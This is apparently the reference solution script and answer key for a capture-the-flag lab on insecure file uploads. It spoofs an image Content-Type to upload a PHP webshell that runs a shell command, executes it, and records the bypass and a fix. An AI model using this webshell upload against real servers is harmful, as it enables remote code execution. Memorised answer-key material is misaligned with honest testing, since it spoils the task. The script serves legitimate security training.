# Reference solution for insecure-file-upload. Runs as root inside the container.
#
# The /upload.php handler only checks the client Content-Type and saves the file
# under its original name into /uploads, which Apache executes. So: send a PHP
# webshell named shell.php while spoofing Content-Type: image/png, then request it.
set -euo pipefail

APP="http://localhost"

# Wait for Apache to come up.
for _ in $(seq 1 40); do
  curl -sf -o /dev/null "$APP/" && break
  sleep 0.5
done

# A webshell that writes the flag (and proves which user it ran as) when executed.
cat > /tmp/shell.php <<'PHP'
<?php
file_put_contents('/flag/solved',
  "flag{snapvault-insecure-upload-rce}\n" .
  "ran-as: " . trim(shell_exec('id -un')) . "\n");
echo "shell active";
PHP

# Upload it, spoofing the Content-Type so the weak check passes.
curl -s -F "photo=@/tmp/shell.php;type=image/png;filename=shell.php" "$APP/upload.php" >/dev/null

# Trigger execution by requesting the uploaded file.
curl -s "$APP/uploads/shell.php" >/dev/null
sleep 1

# Record the findings.
cat > /root/answers.txt <<'EOF'
TRUSTED_HEADER=Content-Type
BYPASS=named the file shell.php (a script extension) while sending Content-Type: image/png
FIX=validate the real file content (magic bytes), store with a random name outside the web root, and never serve uploads as executable
EOF
